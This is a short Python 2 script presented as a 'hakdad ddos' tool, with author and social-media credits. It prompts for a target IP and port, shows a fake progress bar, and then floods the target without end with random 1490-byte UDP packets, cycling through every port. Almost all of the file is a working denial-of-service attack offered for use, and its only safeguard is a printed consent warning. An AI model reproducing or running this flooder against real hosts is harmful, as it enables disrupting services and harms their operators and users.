import sys
import signal
import os
import subprocess
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
os.system("clear")
#################################

#keyword interuption control+c

def signal_handler(signal, frame):
  sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
if signal:
       print " goood....byeee..."
########################################





os.system("figlet ___________")
os.system("toilet -f big ' hakdad ddos' -F gay | lolcat")
print ("                                                     --version 1.0")
os.system("figlet /\/\/\/\/\/\/\/\/\/\/\/\/\/////////////////")
print
print (" Author NAME      :   VAMSI")
print (" YOUTUBE CHANNEL  :   HAKDAD")
print (" INSTAGRAM ID     :   Mr_kali_hacker_7723")
print
ip = raw_input("\033[94m[*] \033[91mPLEASE \033[91mENTER THE IP ADDRESS (or) Hostname of Target : \033[97m>>> \033[93m")
port = input("\033[94m[*] \033[91mPLEASE \033[91mENTER THE PORT                                 : \033[97m>>> \033[93m")
time.sleep(3)
os.system("clear")
print "ATTACK HAS BEEN STARTED......HAVE..A..NICE..DAY.. "
print "DON'T USE ON OTHERS WEBSITES WITHOUT MUTUAL CONSENT"
print "---HAKDAD"
print "use control+c to stop the attack IP "
os.system("figlet Starting the attack...")
print "[                    ] 0% "
time.sleep(3)
print "[=====               ] 25%"
time.sleep(3)
print "[==========          ] 50%"
time.sleep(3)
print "[===============     ] 75%"
time.sleep(4)
print "[====================] 100%"
time.sleep(3)

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s with server hakdad"%(sent,ip,port)
     if port == 65534:
       port = 1




